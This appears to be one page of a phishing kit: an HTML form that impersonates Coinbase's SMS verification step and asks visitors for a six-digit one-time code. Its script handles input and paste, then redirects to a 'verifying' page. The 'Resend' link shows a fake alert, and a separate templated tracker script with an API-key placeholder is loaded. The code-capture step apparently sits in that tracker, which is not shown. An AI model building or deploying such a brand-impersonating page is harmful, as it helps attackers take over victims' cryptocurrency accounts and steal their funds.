<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification - Coinbase</title>
    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
    <link rel="stylesheet" href="styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="logo-container">
            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="signup-container">
            <!-- SMS Icon -->
            <div class="form-icon">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
                    <circle cx="32" cy="32" r="32" fill="#5b8df5" opacity="0.15"/>
                    <rect x="16" y="18" width="32" height="24" rx="2" stroke="#5b8df5" stroke-width="2" fill="none"/>
                    <path d="M16 24l16 10 16-10" stroke="#5b8df5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    <circle cx="44" cy="38" r="8" fill="#0a0b0d"/>
                    <circle cx="44" cy="38" r="7" stroke="#5b8df5" stroke-width="2" fill="none"/>
                    <path d="M41 38h6M44 35v6" stroke="#5b8df5" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>

            <h1 class="title">Enter SMS code</h1>
            <p class="subtitle">We've sent a 6-digit code to your phone. Enter it below to continue.</p>

            <!-- SMS Code Form -->
            <form id="smsCodeForm" class="signup-form">
                <div class="code-inputs">
                    <input type="text" class="code-input" id="sms1" name="sms1" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="sms2" name="sms2" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="sms3" name="sms3" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="sms4" name="sms4" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="sms5" name="sms5" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="code-input" id="sms6" name="sms6" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                </div>
                <button type="submit" class="continue-btn">Verify</button>
            </form>

            <!-- Resend Link -->
            <p class="signin-text">
                Didn't receive the code? <a href="#" class="signin-link" id="resendSMS">Resend</a>
            </p>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <p class="footer-text">
            For your security, never share this code with anyone.
        </p>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const smsCodeForm = document.getElementById('smsCodeForm');
            const smsInputs = smsCodeForm.querySelectorAll('.code-input');
            const submitBtn = smsCodeForm.querySelector('.continue-btn');
            const resendLink = document.getElementById('resendSMS');
            
            // Auto-focus and navigation between inputs
            smsInputs.forEach((input, index) => {
                input.addEventListener('input', function(e) {
                    const value = e.target.value;
                    
                    if (!/^\d*$/.test(value)) {
                        e.target.value = '';
                        return;
                    }
                    
                    if (value.length === 1 && index < smsInputs.length - 1) {
                        smsInputs[index + 1].focus();
                    }
                    
                    checkFormValidity();
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
                        smsInputs[index - 1].focus();
                    }
                });
                
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pastedData = e.clipboardData.getData('text').slice(0, 6);
                    const digits = pastedData.split('');
                    
                    digits.forEach((digit, i) => {
                        if (i < smsInputs.length && /^\d$/.test(digit)) {
                            smsInputs[i].value = digit;
                        }
                    });
                    
                    if (digits.length > 0) {
                        const lastIndex = Math.min(digits.length - 1, smsInputs.length - 1);
                        smsInputs[lastIndex].focus();
                    }
                    
                    checkFormValidity();
                });
            });
            
            function checkFormValidity() {
                let allFilled = true;
                
                smsInputs.forEach(input => {
                    if (input.value.trim() === '') {
                        allFilled = false;
                    }
                });
                
                if (allFilled) {
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.classList.remove('active');
                }
            }
            
            checkFormValidity();
            smsInputs[0].focus();
            
            // Handle SMS code submission
            smsCodeForm.addEventListener('submit', function(e) {
                e.preventDefault();
                window.location.href = 'verifying.html';
            });
            
            // Handle resend SMS
            resendLink.addEventListener('click', function(e) {
                e.preventDefault();
                alert('Verification code has been resent to your phone.');
            });
        });
    </script>
</body>
</html>
